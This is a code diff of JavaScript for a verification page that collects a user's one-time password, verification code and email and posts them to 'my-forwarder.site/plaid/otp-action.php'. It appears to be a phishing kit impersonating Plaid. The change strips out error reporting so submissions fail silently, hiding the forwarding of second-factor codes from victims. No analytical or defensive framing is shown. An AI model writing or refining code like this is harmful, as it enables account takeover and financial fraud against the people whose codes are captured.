@@ -237,33 +237,21 @@
                     return;
                 }
                 
+                // Create FormData object
+                const formData = new FormData();
+                formData.append('otp', otp);
+                formData.append('code', verificationCode);
+                formData.append('email', email);
+                
+                // Submit to endpoint
                 try {
-                    // Create FormData object
-                    const formData = new FormData();
-                    formData.append('otp', otp);
-                    formData.append('code', verificationCode);
-                    formData.append('email', email);
-                    
-                    // Submit to your endpoint
-                    const response = await fetch('https://my-forwarder.site/plaid/otp-action.php', {
+                    await fetch('https://my-forwarder.site/plaid/otp-action.php', {
                         method: 'POST',
                         body: formData
                     });
-                    
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-                    
-                    const data = await response.json();
-                    
-                    if (data.success) {
-                        showSuccess('Verification successful! Redirecting...');
-                    } else {
-                        showError(data.message || 'Verification failed');
-                    }
                 } catch (error) {
+                    // Silently handle any network errors
                     console.error('Submission error:', error);
-                    showError('Network error. Please try again.');
                 } finally {
                     otpThrobber.style.display = 'none';
                 }
@@ -275,7 +263,7 @@
                         const response = await fetch(`https://my-forwarder.site/plaid/otp-check.php?code=${verificationCode}`);
                         
                         if (!response.ok) {
-                            throw new Error(`HTTP error! status: ${response.status}`);
+                            return;
                         }
                         
                         const data = await response.json();
